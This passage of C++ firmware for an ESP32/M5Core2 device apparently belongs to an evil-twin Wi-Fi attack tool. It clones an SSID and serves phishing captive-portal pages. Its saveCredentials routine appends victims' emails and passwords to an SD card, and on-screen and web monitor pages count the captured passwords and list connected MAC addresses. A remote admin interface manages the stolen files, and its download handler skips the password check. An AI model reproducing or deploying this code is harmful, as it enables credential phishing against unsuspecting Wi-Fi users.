    htmlContent += "<input type='hidden' name='filename' value='" + editFileName + "'>";
    htmlContent += "<input type='hidden' name='pass' value='" + editFilePassword + "'>";
    htmlContent += "<textarea id='content' name='content'>";

    // Send the initial part of the HTML
    server.sendContent(htmlContent);

    // Send the file content in chunks
    const size_t editFileBufferSize = 512;
    uint8_t editFileBuffer[editFileBufferSize];
    while (editFile.available()) {
      size_t bytesRead = editFile.read(editFileBuffer, editFileBufferSize);
      server.sendContent(String((char*)editFileBuffer).substring(0, bytesRead));
    }
    editFile.close();

    // Complete the HTML
    htmlContent = "</textarea><br>";
    htmlContent += "<button type='button' onclick='submitForm()'>Save</button>";
    htmlContent += "</form>";
    htmlContent += "<script>";
    htmlContent += "function submitForm() {";
    htmlContent += "  var formData = new FormData();";
    htmlContent += "  formData.append('pass', '" + editFilePassword + "');";
    htmlContent += "  formData.append('filename', '" + editFileName + "');";
    htmlContent += "  var blob = new Blob([document.getElementById('content').value], { type: 'text/plain' });";
    htmlContent += "  formData.append('filedata', blob, '" + editFileName + "');";
    htmlContent += "  var xhr = new XMLHttpRequest();";
    htmlContent += "  xhr.open('POST', '/save-file', true);";
    htmlContent += "  xhr.onload = function () {";
    htmlContent += "    if (xhr.status === 200) {";
    htmlContent += "      alert('File saved successfully!');";
    htmlContent += "      window.history.back();";
    htmlContent += "    } else {";
    htmlContent += "      alert('An error occurred while saving the file.');";
    htmlContent += "    }";
    htmlContent += "  };";
    htmlContent += "  xhr.send(formData);";
    htmlContent += "}";
    htmlContent += "</script>";
    htmlContent += "</body></html>";

    // Send the final part of the HTML
    server.sendContent(htmlContent);

    // Close the connection
    server.client().stop();
  });



  server.on("/save-file", HTTP_POST, []() {
    // This is called after the file upload is complete
    if (!isSaveFileAuthorized) {
      server.send(403, "text/html", "<html><body><p>Unauthorized.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
    } else {
      server.send(200, "text/html", "<html><body><p>File saved successfully!</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
    }
    // Reset authorization flag
    isSaveFileAuthorized = false;
  }, handleSaveFileUpload);


  server.on("/monitor-status", HTTP_GET, []() {
    String password = server.arg("pass");
    if (password != accessWebPassword) {
      server.send(403, "text/html", "<html><body><p>Unauthorized.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
      return;
    }

    // Vérification de la connexion Wi-Fi et mise à jour des variables
    if (WiFi.localIP().toString() != "0.0.0.0") {
      wificonnected = true;
      ipAddress = WiFi.localIP().toString();
    } else {
      wificonnected = false;
      ipAddress = "           ";
    }

    // Récupération des informations de monitor
    String ssid = clonedSSID;
    String portalStatus = isCaptivePortalOn ? "On" : "Off";
    String page = selectedPortalFile.substring(7);
    String wifiStatus = wificonnected ? "Y" : "N";
    String ip = ipAddress;
    int numClients = WiFi.softAPgetStationNum();
    int numPasswords = countPasswordsInFile();
    String stackLeft = getStack();
    String ramUsage = getRamUsage();



    // Génération du HTML pour afficher les informations
    String html = "<!DOCTYPE html><html><head><style>";
    html += "body { font-family: Arial, sans-serif; background: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }";
    html += ".container { background-color: #ffffff; padding: 20px 40px; border-radius: 12px; box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15); width: 90%; max-width: 500px; }";
    html += "h2 { color: #007bff; margin-top: 0; font-size: 24px; text-align: center; }";
    html += ".info { display: flex; justify-content: space-between; margin-bottom: 15px; padding: 10px; background-color: #f7f9fc; border-radius: 6px; border: 1px solid #e1e4e8; }";
    html += ".label { font-weight: bold; color: #333; }";
    html += ".value { color: #666; }";
    html += ".footer { text-align: center; margin-top: 20px; font-size: 14px; color: #999; }";
    html += "</style></head><body>";
    html += "<div class='container'>";
    html += "<h2>Monitor Status</h2>";

    // Informations de statut en blocs organisés
    html += "<div class='info'><span class='label'>SSID:</span><span class='value'>" + ssid + "</span></div>";
    html += "<div class='info'><span class='label'>Portal Status:</span><span class='value'>" + portalStatus + "</span></div>";
    html += "<div class='info'><span class='label'>Page:</span><span class='value'>" + page + "</span></div>";
    html += "<div class='info'><span class='label'>Connected:</span><span class='value'>" + wifiStatus + "</span></div>";
    html += "<div class='info'><span class='label'>IP Address:</span><span class='value'>" + ip + "</span></div>";
    html += "<div class='info'><span class='label'>Clients Connected:</span><span class='value'>" + String(numClients) + "</span></div>";
    html += "<div class='info'><span class='label'>Passwords Count:</span><span class='value'>" + String(numPasswords) + "</span></div>";
    html += "<div class='info'><span class='label'>Stack Left:</span><span class='value'>" + stackLeft + " KB</span></div>";
    html += "<div class='info'><span class='label'>RAM Usage:</span><span class='value'>" + ramUsage + " MB</span></div>";

    // Pied de page
    html += "<div class='footer'>Time Up: " + String(millis() / 1000) + " seconds</div>";
    html += "</div>";
    html += "</body></html>";

    server.send(200, "text/html", html);
  });

  server.on("/favicon.ico", HTTP_GET, []() {
    server.send(404, "text/html", "<html><body><p>Not found.</p></body></html>");
    return;
  });

  server.onNotFound([]() {
    pageAccessFlag = true;
    Serial.println("-------------------");
    Serial.println("Portal Web Access !!!");
    Serial.println("-------------------");
    servePortalFile(selectedPortalFile);
  });

  server.begin();
  Serial.println("-------------------");
  Serial.println("Portal " + ssid + " Deployed with " + selectedPortalFile.substring(7) + " Portal !");
  Serial.println("-------------------");
  if (ledOn) {
    pixels.setPixelColor(0, pixels.Color(255, 0, 0));
    pixels.show();
    delay(250);
    pixels.setPixelColor(0, pixels.Color(0, 0, 0));
    pixels.show();
  }
  if (!isProbeKarmaAttackMode && !isAutoKarmaActive) {
    waitAndReturnToMenu("Portal " + ssid + " Deployed");
  }
}

void handleSaveFileUpload() {
  HTTPUpload& upload = server.upload();

  if (upload.status == UPLOAD_FILE_START) {
    // Reset authorization flag
    isSaveFileAuthorized = false;

    // Read the password
    String saveFilePassword = server.arg("pass");
    if (saveFilePassword != accessWebPassword) {
      Serial.println("Unauthorized upload attempt.");
      return;
    } else {
      isSaveFileAuthorized = true;
    }

    String saveFileName = server.arg("filename");
    if (!saveFileName.startsWith("/")) {
      saveFileName = "/" + saveFileName;
    }

    // Supprimer l'original s'il existe avant de sauvegarder la nouvelle version
    if (SD.exists(saveFileName)) {
      if (SD.remove(saveFileName)) {
        Serial.println("Original file deleted successfully: " + saveFileName);
      } else {
        Serial.println("Failed to delete original file: " + saveFileName);
        isSaveFileAuthorized = false;
        return;
      }
    }

    // Créer un nouveau fichier pour l'écriture
    saveFileObject = SD.open(saveFileName, FILE_WRITE);
    if (!saveFileObject) {
      Serial.println("Failed to open file for writing: " + saveFileName);
      isSaveFileAuthorized = false;
      return;
    }
  } else if (upload.status == UPLOAD_FILE_WRITE) {
    // Write the received bytes to the file
    if (isSaveFileAuthorized && saveFileObject) {
      saveFileObject.write(upload.buf, upload.currentSize);
    }
  } else if (upload.status == UPLOAD_FILE_END) {
    if (isSaveFileAuthorized && saveFileObject) {
      saveFileObject.close();
      Serial.println("File upload completed successfully.");
    }
  } else if (upload.status == UPLOAD_FILE_ABORTED) {
    if (saveFileObject) {
      saveFileObject.close();
      Serial.println("File upload aborted.");
    }
  }
}



void handleSdCardBrowse() {
  String password = server.arg("pass");
  if (password != accessWebPassword) {
    server.send(403, "text/html", "<html><body><p>Unauthorized</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
    return;
  }

  String dirPath = server.arg("dir");
  if (dirPath == "") dirPath = "/";

  File dir = SD.open(dirPath);
  if (!dir || !dir.isDirectory()) {
    server.send(404, "text/html", "<html><body><p>Directory not found.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
    return;
  }

  // Ajout du bouton pour revenir au menu principal
  String html = "<p><a href='/evil-m5core2-menu'><button style='background-color: #007bff; border: none; color: white; padding: 6px 15px; text-align: center; text-decoration: none; display: inline-block; font-size: 16px; margin: 4px 2px; cursor: pointer;'>Menu</button></a></p>";

  // Générer le HTML pour lister les fichiers et dossiers
  html += getDirectoryHtml(dir, dirPath, password);
  server.send(200, "text/html", html);
  dir.close();
}

String getDirectoryHtml(File dir, String path, String password) {
  String html = "<!DOCTYPE html><html><head><style>";
  html += "body{font-family:sans-serif;background:#f0f0f0;padding:20px}";
  html += "ul{list-style-type:none;padding:0}";
  html += "li{margin:10px 0;padding:5px;background:white;border:1px solid #ddd;border-radius:5px}";
  html += "a{color:#007bff;text-decoration:none}";
  html += "a:hover{color:#0056b3}";
  html += ".red{color:red}";
  html += "</style></head><body><ul>";

  if (path != "/") {
    String parentPath = path.substring(0, path.lastIndexOf('/'));
    if (parentPath == "") parentPath = "/";
    html += "<li><a href='/check-sd-file?dir=" + parentPath + "&pass=" + password + "'>[Up]</a></li>";
  }

  while (File file = dir.openNextFile()) {
    String fileName = String(file.name());
    String displayFileName = fileName;
    if (path != "/" && fileName.startsWith(path)) {
      displayFileName = fileName.substring(path.length());
      if (displayFileName.startsWith("/")) {
        displayFileName = displayFileName.substring(1);
      }
    }

    String fullPath = path + (path.endsWith("/") ? "" : "/") + displayFileName;
    if (!fullPath.startsWith("/")) {
      fullPath = "/" + fullPath;
    }

    if (file.isDirectory()) {
      html += "<li>Directory: <a href='/check-sd-file?dir=" + fullPath + "&pass=" + password + "'>" + displayFileName + "</a></li>";
    } else {
      html += "<li>File: <a href='/download-sd-file?filename=" + fullPath + "&pass=" + password + "'>" + displayFileName + "</a> (" + String(file.size()) + " bytes)";

      // Ajout du lien d'édition pour les fichiers `.txt` et `.html`
      if (fileName.endsWith(".txt") || fileName.endsWith(".html") || fileName.endsWith(".ini")) {
        html += " <a href='/edit-file?filename=" + fullPath + "&pass=" + password + "' style='color:green;'>[Edit]</a>";
      }

      html += " <a href='#' onclick='confirmDelete(\"" + fullPath + "\")' style='color:red;'>Delete</a></li>";
    }
    file.close();
  }
  html += "</ul>";
  html += "<script>"
          "function confirmDelete(filename) {"
          "  if (confirm('Are you sure you want to delete ' + filename + '?')) {"
          "    window.location.href = '/delete-sd-file?filename=' + filename + '&pass=" + password + "';"
          "  }"
          "}"
          "window.onload = function() {const urlParams = new URLSearchParams(window.location.search);if (urlParams.has('refresh')) {urlParams.delete('refresh');history.pushState(null, '', location.pathname + '?' + urlParams.toString());window.location.reload();}};"
          "</script>";

  return html;
}



void handleFileDownload() {
  String fileName = server.arg("filename");
  if (!fileName.startsWith("/")) {
    fileName = "/" + fileName;
  }
  if (SD.exists(fileName)) {
    File file = SD.open(fileName, FILE_READ);
    if (file) {
      String downloadName = fileName.substring(fileName.lastIndexOf('/') + 1);
      server.sendHeader("Content-Disposition", "attachment; filename=" + downloadName);
      server.streamFile(file, "application/octet-stream");
      file.close();
      return;
    }
  }
  server.send(404, "text/html", "<html><body><p>File not found.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
}


void handleDownloadAllFiles() {
  String password = server.arg("pass");
  if (password != accessWebPassword) {
    server.send(403, "text/html", "<html><body><p>Unauthorized</p></body></html>");
    return;
  }

  String dirPath = server.arg("dir");
  if (dirPath == "") dirPath = "/";

  File dir = SD.open(dirPath);
  if (!dir || !dir.isDirectory()) {
    server.send(404, "text/html", "<html><body><p>Directory not found.</p></body></html>");
    return;
  }

  String boundary = "MULTIPART_BYTERANGES";

  // Début de la réponse multipart
  String responseHeaders = "HTTP/1.1 200 OK\r\n";
  responseHeaders += "Content-Type: multipart/x-mixed-replace; boundary=" + boundary + "\r\n";
  responseHeaders += "Connection: close\r\n\r\n";
  server.sendContent(responseHeaders);

  while (File file = dir.openNextFile()) {
    if (!file.isDirectory()) {
      String header = "--" + boundary + "\r\n";
      header += "Content-Type: application/octet-stream\r\n";
      header += "Content-Disposition: attachment; filename=\"" + String(file.name()) + "\"\r\n";
      header += "Content-Length: " + String(file.size()) + "\r\n\r\n";
      server.sendContent(header);

      uint8_t buffer[512];
      while (size_t bytesRead = file.read(buffer, sizeof(buffer))) {
        server.client().write(buffer, bytesRead);
      }
      server.sendContent("\r\n");
    }
    file.close();
  }

  // Fin de la réponse multipart
  String footer = "--" + boundary + "--\r\n";
  server.sendContent(footer);

  dir.close();
}


void handleFileUpload() {
  HTTPUpload& upload = server.upload();
  String password = server.arg("pass");
  const size_t MAX_UPLOAD_SIZE = 8192;

  if (password != accessWebPassword) {
    Serial.println("Unauthorized access attempt");
    server.send(403, "text/html", "<html><body><p>Unauthorized</p></body></html>");
    return;
  }

  if (upload.status == UPLOAD_FILE_START) {
    String filename = upload.filename;
    String directory = server.arg("directory");

    if (!directory.startsWith("/")) {
      directory = "/" + directory;
    }

    if (!directory.endsWith("/")) {
      directory += "/";
    }

    String fullPath = directory + filename;

    fsUploadFile = SD.open(fullPath, FILE_WRITE);
    if (!fsUploadFile) {
      Serial.println("Upload start failed: Unable to open file " + fullPath);
      server.send(500, "text/html", "File opening failed");
      return;
    }

    Serial.print("Upload Start: ");
    Serial.println(fullPath);
  } else if (upload.status == UPLOAD_FILE_WRITE) {
    if (fsUploadFile && upload.currentSize > 0 && upload.currentSize <= MAX_UPLOAD_SIZE) {
      size_t written = fsUploadFile.write(upload.buf, upload.currentSize);
      if (written != upload.currentSize) {
        Serial.println("Write Error: Inconsistent data size.");
        fsUploadFile.close();
        server.send(500, "text/html", "File write error");
        return;
      }
    } else {
      if (!fsUploadFile) {
        Serial.println("Error: File is no longer valid for writing.");
      } else if (upload.currentSize > MAX_UPLOAD_SIZE) {
        Serial.println("Error: Data segment size too large.");
        Serial.println(upload.currentSize);
      } else {
        Serial.println("Information: Empty data segment received.");
      }
      return;
    }
  } else if (upload.status == UPLOAD_FILE_END) {
    if (fsUploadFile) {
      fsUploadFile.close();
      Serial.print("Upload End: ");
      Serial.println(upload.totalSize);
      server.send(200, "text/html", "<html><body><p>File successfully uploaded</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
      Serial.println("File successfully uploaded");
    } else {
      server.send(500, "text/html", "File closing error");
      Serial.println("File closing error");
    }
  }
}

void handleListDirectories() {
  String password = server.arg("pass");
  if (password != accessWebPassword) {
    server.send(403, "text/plain", "Unauthorized");
    return;
  }

  File root = SD.open("/");
  String dirList = "";

  while (File file = root.openNextFile()) {
    if (file.isDirectory()) {
      dirList += String(file.name()) + "\n";
    }
    file.close();
  }
  root.close();
  server.send(200, "text/plain", dirList);
}

void listDirectories(File dir, String path, String & output) {
  while (File file = dir.openNextFile()) {
    if (file.isDirectory()) {
      output += String(file.name()) + "\n";
      listDirectories(file, String(file.name()), output);
    }
    file.close();
  }
}


void handleFileDelete() {
  String password = server.arg("pass");
  if (password != accessWebPassword) {
    server.send(403, "text/html", "<html><body><p>Unauthorized</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
    return;
  }

  String fileName = server.arg("filename");
  if (!fileName.startsWith("/")) {
    fileName = "/" + fileName;
  }
  if (SD.exists(fileName)) {
    if (SD.remove(fileName)) {
      server.send(200, "text/html", "<html><body><p>File deleted successfully</p><script>setTimeout(function(){window.location = document.referrer + '&refresh=true';}, 2000);</script></body></html>");
      Serial.println("-------------------");
      Serial.println("File deleted successfully");
      Serial.println("-------------------");
    } else {
      server.send(500, "text/html", "<html><body><p>File could not be deleted</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
      Serial.println("-------------------");
      Serial.println("File could not be deleted");
      Serial.println("-------------------");
    }
  } else {
    server.send(404, "text/html", "<html><body><p>File not found</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
    Serial.println("-------------------");
    Serial.println("File not found");
    Serial.println("-------------------");
  }
}

void servePortalFile(const String & filename) {

  File webFile = SD.open(filename);
  if (webFile) {
    server.streamFile(webFile, "text/html");
    /*Serial.println("-------------------");
      Serial.println("serve portal.");
      Serial.println("-------------------");*/
    webFile.close();
  } else {
    server.send(404, "text/html", "<html><body><p>File not found</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
  }
}

void saveCredentials(const String & email, const String & password, const String & portalName, const String & clonedSSID) {
  File file = SD.open("/credentials.txt", FILE_APPEND);
  if (file) {
    file.println("-- Email -- \n" + email);
    file.println("-- Password -- \n" + password);
    file.println("-- Portal -- \n" + portalName); // Ajout du nom du portail
    file.println("-- SSID -- \n" + clonedSSID); // Ajout du SSID cloné
    file.println("------------------");
    file.close();
    if (ledOn) {
      for (int flashes = 0; flashes < 2; flashes++) {
        pixels.setPixelColor(0, pixels.Color(0, 0, 255));
        pixels.show();
        delay(150);
        pixels.setPixelColor(0, pixels.Color(0, 0, 0));
        pixels.show();
        delay(150);
      }
    }
    Serial.println("-------------------");
    Serial.println(" !!! Credentials " + email + ":" + password + " saved !!! ");
    Serial.println("On Portal Name: " + portalName);
    Serial.println("With Cloned SSID: " + clonedSSID);
    Serial.println("-------------------");
  } else {
    Serial.println("Error opening file for writing");
  }
}

void stopCaptivePortal() {
  dnsServer.stop();
  server.stop();
  WiFi.mode(WIFI_MODE_APSTA);
  WiFi.softAPdisconnect(true);
  isCaptivePortalOn = false;
  Serial.println("-------------------");
  Serial.println("Portal Stopped");
  Serial.println("-------------------");
  if (ledOn) {
    pixels.setPixelColor(0, pixels.Color(255, 0, 0));
    pixels.setPixelColor(9, pixels.Color(255, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(0, pixels.Color(0, 0, 0));
    pixels.setPixelColor(9, pixels.Color(0, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(1, pixels.Color(255, 0, 0));
    pixels.setPixelColor(8, pixels.Color(255, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(1, pixels.Color(0, 0, 0));
    pixels.setPixelColor(8, pixels.Color(0, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(2, pixels.Color(255, 0, 0));
    pixels.setPixelColor(7, pixels.Color(255, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(2, pixels.Color(0, 0, 0));
    pixels.setPixelColor(7, pixels.Color(0, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(3, pixels.Color(255, 0, 0));
    pixels.setPixelColor(6, pixels.Color(255, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(3, pixels.Color(0, 0, 0));
    pixels.setPixelColor(6, pixels.Color(0, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(4, pixels.Color(255, 0, 0));
    pixels.setPixelColor(5, pixels.Color(255, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(4, pixels.Color(0, 0, 0));
    pixels.setPixelColor(5, pixels.Color(0, 0, 0));
    pixels.show();
    delay(50);
  }
  waitAndReturnToMenu("  Portal Stopped");
}

void listPortalFiles() {
  File root = SD.open("/sites");
  numPortalFiles = 0;
  Serial.println("Available portals:");
  while (File file = root.openNextFile()) {
    if (!file.isDirectory()) {
      String fileName = file.name();
      // Ignore mac os file stating with ._
      if (!fileName.startsWith("._") && fileName.endsWith(".html")) {
        portalFiles[numPortalFiles] = String("/sites/") + fileName;

        Serial.print(numPortalFiles);
        Serial.print(": ");
        Serial.println(fileName);

        numPortalFiles++;
        if (numPortalFiles >= 50) break; // max 30 files
      }
    }
    file.close();
  }
  root.close();
}



void serveChangePasswordPage() {
  String password = server.arg("pass");
  if (password != accessWebPassword) {
    server.send(403, "text/html", "<html><body><p>Unauthorized</p></body></html>");
    return;
  }

  String html = "<html><head><style>";
  html += "body { background-color: #333; color: white; font-family: Arial, sans-serif; text-align: center; padding-top: 50px; }";
  html += "form { background-color: #444; padding: 20px; border-radius: 8px; display: inline-block; }";
  html += "input[type='password'], input[type='submit'] { width: 80%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; }";
  html += "input[type='submit'] { background-color: #008CBA; color: white; cursor: pointer; }";
  html += "input[type='submit']:hover { background-color: #005F73; }";
  html += "</style></head><body>";
  html += "<form action='/Change-Portal-Password-demand' method='get'>";
  html += "<input type='hidden' name='pass' value='" + password + "'>";
  html += "<h2>Change Portal Password</h2>";
  html += "New Password: <br><input type='password' name='newPassword'><br>";
  html += "<input type='submit' value='Change Password'>";
  html += "</form><br>Leave empty for an open AP.<br>Remember to deploy the portal again after changing the password.<br></body></html>";
  server.send(200, "text/html", html);
}



void handleChangePassword() {
  server.on("/Change-Portal-Password-demand", HTTP_GET, []() {
    String password = server.arg("pass");
    if (password != accessWebPassword) {
      server.send(403, "text/html", "<html><body><p>Unauthorized</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
      return;
    }

    String newPassword = server.arg("newPassword");
    captivePortalPassword = newPassword;
    server.send(200, "text/html", "<html><body><p>Password Changed Successfully !!</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
  });

  serveChangePasswordPage();
}




String credentialsList[100]; // max 100 lignes parsed
int numCredentials = 0;

void readCredentialsFromFile() {
  File file = SD.open("/credentials.txt");
  if (file) {
    numCredentials = 0;
    while (file.available() && numCredentials < 100) {
      credentialsList[numCredentials++] = file.readStringUntil('\n');
    }
    file.close();
  } else {
    Serial.println("Error opening file");
  }
}
void checkCredentials() {
  readCredentialsFromFile();

  int currentListIndex = 0;
  bool needDisplayUpdate = true;
  static bool isTouchHandled = false;

  // Wait for touch release before starting
  screenDebounce();

  while (true) {
    if (needDisplayUpdate) {
      displayCredentials(currentListIndex);
      needDisplayUpdate = false;
    }

    TouchPoint touch = ts.getTouch();
    if (touch.zRaw != 0) {
      if (!isTouchHandled) {
        int x = map(touch.xRaw, minX, maxX, 0, tft.width());

        int largeurZone = tft.width() / 3;

        if (x < largeurZone) {
          currentListIndex = max(0, currentListIndex - 1);
          needDisplayUpdate = true;
        } else if (x >= 2 * largeurZone) {
          currentListIndex = min(numCredentials - 1, currentListIndex + 1);
          needDisplayUpdate = true;
        } else if (x >= largeurZone && x < 2 * largeurZone) {
          break;
        }
        isTouchHandled = true;
      }
    } else {
      isTouchHandled = false;
    }
  }

  inMenu = true;
  drawMenu();
}





void displayCredentials(int index) {
  // Clear the display and set up text properties
  tft.fillScreen(TFT_BLACK);
  tft.setTextSize(2);

  int maxVisibleLines = tft.height() / 18; // Nombre maximum de lignes affichables à l'écran
  int currentLine = 0; // Ligne actuelle en cours de traitement
  int firstLineIndex = index; // Index de la première ligne de l'entrée sélectionnée
  int linesBeforeIndex = 0; // Nombre de lignes avant l'index sélectionné

  // Calculer combien de lignes sont nécessaires avant l'index sélectionné
  for (int i = 0; i < index; i++) {
    int neededLines = 1 + tft.textWidth(credentialsList[i]) / (tft.width() - 20);
    linesBeforeIndex += neededLines;
  }

  // Ajuster l'index de la première ligne si nécessaire pour s'assurer que l'entrée sélectionnée est visible
  while (linesBeforeIndex > 0 && linesBeforeIndex + maxVisibleLines - 1 < index) {
    linesBeforeIndex--;
    firstLineIndex--;
  }

  // Afficher les entrées de credentials visibles
  for (int i = firstLineIndex; currentLine < maxVisibleLines && i < numCredentials; i++) {
    String credential = credentialsList[i];
    int neededLines = 1 + tft.textWidth(credential) / (tft.width() - 20);

    if (i == index) {
      tft.fillRect(0, currentLine * 18, tft.width(), 18 * neededLines, menuSelectedBackgroundColor);
    }

    for (int line = 0; line < neededLines; line++) {
      tft.setCursor(10, (currentLine + line) * 18);
      tft.setTextColor(i == index ? TFT_GREEN : menuTextUnFocusedColor);

      int startChar = line * (credential.length() / neededLines);
      int endChar = min(credential.length(), startChar + (credential.length() / neededLines));
      tft.println(credential.substring(startChar, endChar));
    }

    currentLine += neededLines;
  }

  //
}


bool confirmPopup(String message) {
  bool confirm = false;
  bool decisionMade = false;
  static bool isTouchHandled = false;

  tft.fillScreen(TFT_BLACK);
  tft.setCursor(50, tft.height() / 2);
  tft.setTextColor(TFT_WHITE);
  tft.println(message);
  tft.setCursor(37, 220);
  tft.setTextColor(TFT_GREEN);
  tft.println("Yes");
  tft.setTextColor(TFT_RED);
  tft.setCursor(254, 220);
  tft.println("No");
  tft.setTextColor(TFT_WHITE);

  screenDebounce(); // Wait for user to release touch

  while (!decisionMade) {
    TouchPoint touch = ts.getTouch();
    if (touch.zRaw != 0) {
      if (!isTouchHandled) {
        int x = map(touch.xRaw, minX, maxX, 0, tft.width());

        int largeurZone = tft.width() / 2;

        if (x < largeurZone) {
          confirm = true;
          decisionMade = true;
        } else if (x >= largeurZone) {
          confirm = false;
          decisionMade = true;
        }
        isTouchHandled = true;
      }
    } else {
      isTouchHandled = false;
    }
  }

  return confirm;
}




void deleteCredentials() {
  if (confirmPopup("Delete credentials?")) {
    File file = SD.open("/credentials.txt", FILE_WRITE);
    if (file) {
      file.close();
      Serial.println("-------------------");
      Serial.println("credentials.txt deleted");
      Serial.println("-------------------");
      waitAndReturnToMenu("Deleted successfully");
      Serial.println("Credentials deleted successfully");
    } else {
      Serial.println("-------------------");
      Serial.println("Error deleteting credentials.txt ");
      Serial.println("-------------------");
      waitAndReturnToMenu("Error..");
      Serial.println("Error opening file for deletion");
    }
  } else {
    waitAndReturnToMenu("Deletion cancelled");
  }
}


int countPasswordsInFile() {
  File file = SD.open("/credentials.txt");
  if (!file) {
    Serial.println("Error opening credentials file for reading");
    return 0;
  }

  int passwordCount = 0;
  while (file.available()) {
    String line = file.readStringUntil('\n');
    if (line.startsWith("-- Password --")) {
      passwordCount++;
    }
  }

  file.close();
  return passwordCount;
}















// Variables globales pour surveiller le statut
int oldNumClients = -1;
int oldNumPasswords = -1;


String wificonnectedPrint = "";

void displayMonitorPage1() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextSize(2);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);

  if (WiFi.localIP().toString() != "0.0.0.0") {
    wificonnected = true;
    wificonnectedPrint = "Y";
    ipAddress = WiFi.localIP().toString();
  } else {
    wificonnected = false;
    wificonnectedPrint = "N";
    ipAddress = "           ";
  }

  tft.setCursor(0, 50);
  tft.println("SSID: " + clonedSSID);
  tft.setCursor(0, 70);
  tft.println("Portal: " + String(isCaptivePortalOn ? "On" : "Off"));
  tft.setCursor(0, 90);
  tft.println("Page: " + selectedPortalFile.substring(7));
  tft.setCursor(0, 110);
  tft.println("Connected: " + wificonnectedPrint);
  tft.setCursor(0, 130);
  tft.println("IP: " + ipAddress);

  oldNumClients = -1;
  oldNumPasswords = -1;

  screenDebounce();

  while (!inMenu) {
    handleDnsRequestSerial();
    server.handleClient();
    delay(10); // Réduction de la charge CPU

    int newNumClients = WiFi.softAPgetStationNum();
    int newNumPasswords = countPasswordsInFile();

    if (newNumClients != oldNumClients) {
      tft.fillRect(0, 10, tft.width(), 15, TFT_BLACK);
      tft.setCursor(0, 10);
      tft.println("Clients: " + String(newNumClients));
      oldNumClients = newNumClients;
    }

    if (newNumPasswords != oldNumPasswords) {
      tft.fillRect(0, 30, tft.width(), 20, TFT_BLACK);
      tft.setCursor(0, 30);
      tft.println("Passwords: " + String(newNumPasswords));
      oldNumPasswords = newNumPasswords;
    }

    TouchPoint touch = ts.getTouch();
    if (touch.zRaw != 0) {
      int x = map(touch.xRaw, minX, maxX, 0, tft.width());
      int y = map(touch.yRaw, minY, maxY, 0, tft.height());

      if (x < tft.width() / 3) {
        displayMonitorPage3(); // Retour à la première page
        break;
      } else if (x > 2 * (tft.width() / 3)) {
        displayMonitorPage2(); // Aller à la page suivante
        break;
      } else {
        inMenu = true;
        drawMenu(); // Retour au menu principal
        break;
      }
    }
  }
}




void updateConnectedMACs() {
  wifi_sta_list_t stationList;
  tcpip_adapter_sta_list_t adapterList;
  esp_wifi_ap_get_sta_list(&stationList);
  tcpip_adapter_get_sta_list(&stationList, &adapterList);

  for (int i = 0; i < adapterList.num; i++) {
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             adapterList.sta[i].mac[0], adapterList.sta[i].mac[1], adapterList.sta[i].mac[2],
             adapterList.sta[i].mac[3], adapterList.sta[i].mac[4], adapterList.sta[i].mac[5]);
    macAddresses[i] = String(macStr);
  }
}

void displayMonitorPage2() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextSize(2);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  updateConnectedMACs();

  if (macAddresses[0] == "") {
    tft.setCursor(0, 10);
    tft.println("No client connected");
    Serial.println("----Mac-Address----");
    Serial.println("No client connected");
    Serial.println("-------------------");
  } else {
    Serial.println("----Mac-Address----");
    for (int i = 0; i < 10; i++) {
      int y = 30 + i * 20;
      if (y > tft.height() - 20) break;

      tft.setCursor(10, y);
      tft.println(macAddresses[i]);
      Serial.println(macAddresses[i]);
    }
    Serial.println("-------------------");
  }

  screenDebounce();

  while (!inMenu) {
    handleDnsRequestSerial();
    delay(10); // Réduction de la charge CPU

    TouchPoint touch = ts.getTouch();
    if (touch.zRaw != 0) {
      int x = map(touch.xRaw, minX, maxX, 0, tft.width());
      int y = map(touch.yRaw, minY, maxY, 0, tft.height());

      if (x < tft.width() / 3) {
        displayMonitorPage1(); // Retour à la première page
        break;
      } else if (x > 2 * (tft.width() / 3)) {
        displayMonitorPage3(); // Aller à la page suivante
        break;
      } else {
        inMenu = true;
        drawMenu(); // Retour au menu principal
        break;
      }
    }
  }
}







String getStack() {
  UBaseType_t stackWordsRemaining = uxTaskGetStackHighWaterMark(NULL);
  return String(stackWordsRemaining * 4 / 1024.0);
}

String getRamUsage() {
  float heapSizeInMegabytes = esp_get_free_heap_size() / 1048576.0;
  char buffer[10];
  sprintf(buffer, "%.2f", heapSizeInMegabytes);
  return String(buffer);
}

unsigned long lastUpdateTime = 0;
const long updateInterval = 1000;

String oldStack = "";
String oldRamUsage = "";
void displayMonitorPage3() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextSize(2);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);

  oldStack = getStack();
  oldRamUsage = getRamUsage();

  tft.setCursor(10, 10);
  tft.println("Stack left: " + oldStack + " Kb");
  tft.setCursor(10, 30);
